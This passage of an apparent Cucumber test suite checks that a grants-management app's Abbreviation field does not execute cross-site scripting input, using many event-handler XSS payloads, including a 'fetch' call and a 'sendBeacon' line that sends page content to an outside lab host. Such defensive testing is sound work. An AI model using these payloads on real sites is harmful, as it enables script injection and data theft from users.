      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                        | Field                |
      | <style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300728 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                              | Field                |
      | <xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300729 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                       | Field                |
      | <style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300736 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                      | Field                |
      | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300740 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                               | Field                |
      | <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300743 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                               | Field                |
      | <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300745 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                             | Field                |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300746 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                  | Field                |
      | <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300747 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                               | Field                |
      | <style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300749 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                          | Field                |
      | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300755 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                        | Field                |
      | <body onafterprint=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300756 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                       | Field                |
      | <input onauxclick=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300757 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                               | Field                |
      | <a onbeforecopy="alert(1)" contenteditable>test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300760 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                              | Field                |
      | <a onbeforecut="alert(1)" contenteditable>test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300761 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | <xss contenteditable onbeforeinput=alert(1)>test | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300762 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                    | Field                |
      | <xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300764 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                               | Field                |
      | <input onchange=alert(1) value=xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300765 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                  | Field                |
      | <xss onclick="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
